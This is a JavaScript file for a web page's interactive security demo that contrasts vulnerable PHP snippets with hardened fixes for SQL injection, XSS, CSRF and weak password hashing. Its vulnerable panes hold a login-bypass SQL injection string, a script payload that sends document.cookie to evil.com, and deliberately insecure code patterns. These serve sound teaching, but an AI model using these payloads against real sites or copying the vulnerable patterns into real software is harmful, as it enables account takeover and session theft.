/**
 * Interactive Security Visualizer
 * Demonstrates OWASP Top 10 vulnerabilities vs. Defensive Hardened Solutions
 */

document.addEventListener('DOMContentLoaded', () => {
    const demoTabs = document.querySelectorAll('.sec-demo-tab');
    const demoContainer = document.getElementById('secDemoContainer');

    if (!demoTabs.length || !demoContainer) return;

    const demos = {
        sqli: {
            title: 'A03:2021 - Injection (SQLi)',
            description: 'Unsanitized input concatenated directly into SQL queries allows attackers to bypass authentication or extract entire databases.',
            vulnCode: `// ❌ VULNERABLE: Direct string concatenation
$username = $_POST['user'];
$password = $_POST['pass'];

// Attacker inputs: ' OR '1'='1' -- 
$query = "SELECT * FROM users WHERE user = '$username' AND pass = '$password'";
$result = $db->query($query); 
// Results in TRUE condition; attacker logs in as admin!`,
            safeCode: `// ✅ SECURED: PDO Parameterized Prepared Statements
$username = $_POST['user'];
$password = $_POST['pass'];

$stmt = $pdo->prepare("SELECT id, pass_hash FROM users WHERE user = :user LIMIT 1");
// Input is treated purely as data, never parsed as executable SQL
$stmt->execute([':user' => $username]);
$user = $stmt->fetch();

if ($user && password_verify($password, $user['pass_hash'])) {
    // Authenticated safely
}`
        },
        xss: {
            title: 'A03:2021 - Cross-Site Scripting (XSS)',
            description: 'Unescaped user input rendered directly in browser context allows script execution, cookie theft, and session hijacking.',
            vulnCode: `// ❌ VULNERABLE: Raw echo of untrusted input
$comment = $_POST['comment'];
// Attacker sends: <script>fetch('http://evil.com/steal?cookie=' + document.cookie)</script>
echo "<div>" . $comment . "</div>";
// The malicious script executes in the victim's browser!`,
            safeCode: `// ✅ SECURED: Context-Aware Output Encoding & CSP
$comment = $_POST['comment'];

// 1. Convert dangerous chars (<, >, ", ') into harmless HTML entities
echo "<div>" . htmlspecialchars($comment, ENT_QUOTES | ENT_HTML5, 'UTF-8') . "</div>";

// 2. Strict Content Security Policy blocks unauthorized scripts
header("Content-Security-Policy: default-src 'self'; script-src 'self'");`
        },
        csrf: {
            title: 'A01:2021 - Cross-Site Request Forgery (CSRF)',
            description: 'Malicious third-party sites exploit ambient browser credentials to trick victims into executing unwanted state changes.',
            vulnCode: `// ❌ VULNERABLE: Unprotected State Change
// POST /transfer.php?amount=5000&to=attacker_account
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $amount = $_POST['amount'];
    $to = $_POST['to'];
    // Accepts requests from external phishing forms using victim's active cookie!
    transferFunds($_SESSION['user_id'], $to, $amount);
}`,
            safeCode: `// ✅ SECURED: Cryptographic Token + SameSite Cookie
// 1. Verify unpredictable token stored in session
$submittedToken = $_POST['csrf_token'] ?? '';
if (!hash_equals($_SESSION['csrf_token'], $submittedToken)) {
    http_response_code(403);
    die('CSRF token validation failed.');
}

// 2. Cookie attribute: SameSite=Lax/Strict prevents cross-site browser sends`
        },
        auth: {
            title: 'A07:2021 - Identification & Authentication Failures',
            description: 'Using legacy hashing algorithms (MD5, SHA1) or failing to protect against brute force attacks exposes credential stores.',
            vulnCode: `// ❌ VULNERABLE: Fast hashing & no rate limits
$password = $_POST['password'];
$hash = md5($password); // Broken: vulnerable to rainbow tables and GPUs (billions/sec)

// No brute force prevention; attackers can guess millions of passwords per minute.`,
            safeCode: `// ✅ SECURED: Memory-Hard Bcrypt/Argon2id & Adaptive Throttling
// 1. Password hashing with automatic per-password random salt
$hash = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);

// 2. Constant-time verification
if (password_verify($password, $storedHash)) { ... }

// 3. IP / Session rate limiting enforces 5-minute lockout on repeated failures`
        }
    };

    function renderDemo(key) {
        const data = demos[key];
        if (!data) return;

        demoContainer.innerHTML = `
            <div style="margin-bottom: 1rem;">
                <h4 style="font-family: var(--font-mono); color: var(--neon-cyan); font-size: 1.1rem; margin-bottom: 0.3rem;">
                    ${data.title}
                </h4>
                <p style="color: var(--text-muted); font-size: 0.9rem;">
                    ${data.description}
                </p>
            </div>
            <div class="sec-demo-content">
                <div>
                    <div class="sec-pane-title" style="color: #ff6b81;">
                        <span>⚠️ Vulnerable Pattern (Breach Risk)</span>
                    </div>
                    <pre class="sec-code-box"><code>${escapeHtml(data.vulnCode)}</code></pre>
                </div>
                <div>
                    <div class="sec-pane-title" style="color: var(--neon-emerald);">
                        <span>🛡️ Hardened Implementation (Defensive Pattern)</span>
                    </div>
                    <pre class="sec-code-box safe"><code>${escapeHtml(data.safeCode)}</code></pre>
                </div>
            </div>
        `;
    }

    demoTabs.forEach(tab => {
        tab.addEventListener('click', () => {
            demoTabs.forEach(t => t.classList.remove('active'));
            tab.classList.add('active');
            const key = tab.getAttribute('data-demo');
            renderDemo(key);
        });
    });

    // Initial render
    renderDemo('sqli');

    function escapeHtml(str) {
        return str.replace(/[&<>"']/g, (m) => ({
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#039;'
        }[m]));
    }
});
